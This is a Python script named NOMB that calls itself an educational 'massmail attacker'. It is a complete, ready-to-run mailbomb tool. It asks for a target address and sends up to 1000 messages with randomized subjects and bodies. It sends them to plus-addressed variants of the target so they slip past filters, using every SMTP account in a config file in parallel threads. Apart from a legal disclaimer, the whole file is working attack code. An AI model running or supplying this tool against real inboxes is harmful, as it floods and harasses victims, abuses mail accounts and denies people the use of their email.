"""
NOMB is a massmail attacker, which helps the security analysis to understand the process of 
massmail and/or mailbomb attack. However using this scripts without the permission of the 
mail owner can be illegal.
Author : Nabil 
Last modified : 29th October, 2024
"""

# importing libs
import smtplib
import random
import string
import re
import json
import sys
import os
from email.mime.text import MIMEText
import threading

logo = r""" _   _  ___  __  __ ____
| \ | |/ _ \|  \/  | __ )
|  \| | | | | |\/| |  _ \
| |\  | |_| | |  | | |_) |
|_| \_|\___/|_|  |_|____/ """

logo_with_color = f"""{"\033[1;33m"}{logo}{"\033[0m"}"""
# General Header
print(f"""{logo_with_color}      [Enjoy the NOMB Experience]""")
print("****************************************************************")
print("*             © Copyright NABIL, 2024                          *")
print("\n*           https://w3nabil.github.io/                         *")
print("****************************************************************")
print(f"{"\033[1;33m"}Caution: The NOMB Script was made for educational and ethical purposes. Misuse against any emails may have legal consequences.{"\033[0m"}")

# Checking if config file exist or not, if not then exit
if not os.path.exists('config.json'):
    print(f"{"\033[31m"}Config file not found, Try running sudo config.py first.{"\033[0m"}")
    sys.exit(1)
else:
    print(f"{"\033[32m"}Found config.json{"\033[0m"}")

# Check if src exist or not, if not then create
if not os.path.exists(os.path.join(os.getcwd(), 'src')):
    try:
        os.makedirs(os.path.join(os.getcwd(), 'src'))
        print(f"{"\033[32m"}Folder 'src' created.{"\033[0m"}")
    except Exception as e:
        print("Failed to create 'src' folder, Try creating the folder or run the script with sudo")
        sys.exit(1)
else:
    print(f"{"\033[32m"}Found src folder{"\033[0m"}")

# Showing all the accounts in the config file
print(f"\n\n\t\t{"\033[1;33m"}ACCOUNTS FOUND CONFIG FILE{"\033[0m"}") 
print(f"\n\t{"\033[32m"}SL  | \tSMTP Server  | \tSMTP PORT | \tSMTP User")
print(f"\t--------------------------------------------------{"\033[0m"}")
with open("config.json", "r") as f:
    data = json.load(f)
    for i in data:
        print(f"{"\033[32m"}\t{i['sl']}  |{"\033[0m"} \t{i['smtp_server']} | \t{i['smtp_port']} | \t{i['smtp_user']}")
    f.close()
print("\n\n")

print("How many mails would you like to send? [Default 100]\n")
AttackRange = input(" > ") or 100

# Limiting the Attack Range
if int(AttackRange) > 1000:
    print("The Maximum limit to send mailbomb is set to 1000 to prevent extreme spam.")
    print("The attack range is automatically set to 1000")
    AttackRange = 1000
elif int(AttackRange) <= 0:
    print("The minimum limit to send mailbomb is set to 1.")
    print("The attack range is automatically set to 1")
    AttackRange = 1

# Target Email Input
print("Please provide the target email address..")
targetemail = input(" > ")

""" 
Validate Target Email Address. 
i wanted to loop email validator, for example if the email is invalid then it will ask for the email again
Probably will add this feature in the future 
"""
def validemail(email):
    if not re.match(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$', email):
        print("Invalid Email Address")
        sys.exit(1)
    else:
        email = email

# Checking email
validemail(email=targetemail)

# Split the mail address
email = targetemail.split("@")

# Subject, If custom ignore else create random 
print("Do you have a custom subject file? [Default = 2]")
print(" (1) Yes\n (2) No")
subjectchoice = input(" > ") or "2"
if subjectchoice == "1" or subjectchoice.lower() == "yes":
    # using custom subject (Plain) file 
    if os.path.exists('./src/mailsubject.txt'):
        print("Using custom subject file")
    else:
        print("Thank you for lying")
        sys.exit(1)
elif subjectchoice == "2" or subjectchoice.lower() == "no":
    # Subject (Plain)
    print("Please Write down the Subject of the email..")
    mailsubject = input(" > ") or "Who nombed you?"

    # Make Subject List (Changeable)
    with open('./src/mailsubject.txt', 'w') as file:
        for i in range(int(AttackRange)):
            RanLetters = ''.join(random.choice(string.ascii_letters)for _ in range(6))
            Subject = f"{mailsubject} [" + RanLetters + "]"
            file.write(Subject+'\n')
        file.close()
else:
    print("Invalid Input")
    sys.exit(1)

# Body, If custom ignore else create random
print("Do you have a custom body file? [Default = 2]")
print(" (1) Yes\n (2) No")
bodychoice = input(" > ") or "2"
if bodychoice == "1" or bodychoice.lower() == "yes":
    # using custom body (Plain) file 
    if os.path.exists('./src/mailbody.txt'):
        print("Using custom body file")
    else:
        print("Thank you for lying")
        sys.exit(1)
elif bodychoice == "2" or bodychoice.lower() == "no":
    # Body (Plain), Added my favorite song lyrics never mind it at all 
    print("Please Write down the Body of the email..")
    mailbody = input(" > ") or "Good morning, hello, good night. September, How are you? Are you going to school? To be honest, I thought school was crap. To those who don't want to go to school tomorrow, don't worry, being an adult is fun."

    # Make Body List (Changeable)
    with open('./src/mailbody.txt', 'w') as file:
        for i in range(int(AttackRange)):
            RanLetters = ''.join(random.choice(string.ascii_letters)for _ in range(6))
            Body = f"{mailbody} (" + RanLetters +  ")"
            file.write(Body + '\n')
        file.close()
else:
    print("Invalid Input")
    sys.exit(1)

"""Thinking of adding custom sender name, but it requires some py libs which are not probably available in kali linux"""
"""
# Sender Name (Plain)
print("Beep Boop! Whats the name of the sender? [Default = Call Ambulance]")
mailname = input(" > ") or "Call Ambulance, not for me!" 
"""

"""This email generation with plus string shouldnt be erased or edited, as it is the main feature of the script"""
# Make Mail List (Changeable Everytime)
with open('./src/maillist.txt', 'w') as file:
    for i in range(int(AttackRange)):
        RanLetters = ''.join(random.choice(string.ascii_letters)for _ in range(6))
        Mail = email[0] + "+" + RanLetters + "@" + email[1]
        file.write(Mail+ '\n')
    file.close()

"""
Function for reading files 
"""
def read_file(filepath):
    with open(filepath, 'r') as file:
        return [line.strip() for line in file.readlines()]

# getting data from files
Emails = read_file('./src/maillist.txt')
Subjects = read_file('./src/mailsubject.txt')
Bodies = read_file('./src/mailbody.txt')


# Load config file
with open("config.json", "r") as f:
    user_data = json.load(f)
    f.close()

# Function to send an email
def send_email(receiver_email, subject, body, smtp_details):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = smtp_details['smtp_user'] 
    msg['To'] = receiver_email

    # Try to connect to the SMTP server
    try:
        with smtplib.SMTP(smtp_details['smtp_server'], smtp_details['smtp_port']) as server:
            server.starttls()
            try:
                server.login(smtp_details['smtp_user'], smtp_details['smtp_password'])
            except Exception as e:
                print(f"{receiver_email} |\t {smtp_details['smtp_user']} |\t LOGIN ISSUES: {e}")
                return

            server.sendmail(smtp_details['smtp_user'], receiver_email, msg.as_string())
            print(f"{receiver_email} |\t {smtp_details['smtp_user']} |\t SENT")
    except Exception as e:
        print(f"{receiver_email} |\t {smtp_details['smtp_user']} |\t FAILED: {e}")

# Function to send emails using a specific SMTP account
def send_emails_from_account(smtp_details):
    for i in range(len(Emails)):
        receiver_email = Emails[i]
        subject = Subjects[i % len(Subjects)]
        body = Bodies[i % len(Bodies)]        
        send_email(receiver_email, subject, body, smtp_details)

# List to hold the threads
threads = []

# Print header only once
print("    TARGET       |\t        RESPONSIBLE      |\t STATUS")

# Loop through each SMTP account
for smtp in user_data:
    thread = threading.Thread(target=send_emails_from_account, args=(smtp,))
    threads.append(thread)
    thread.start()

# Wait for all threads to complete
for thread in threads:
    thread.join()
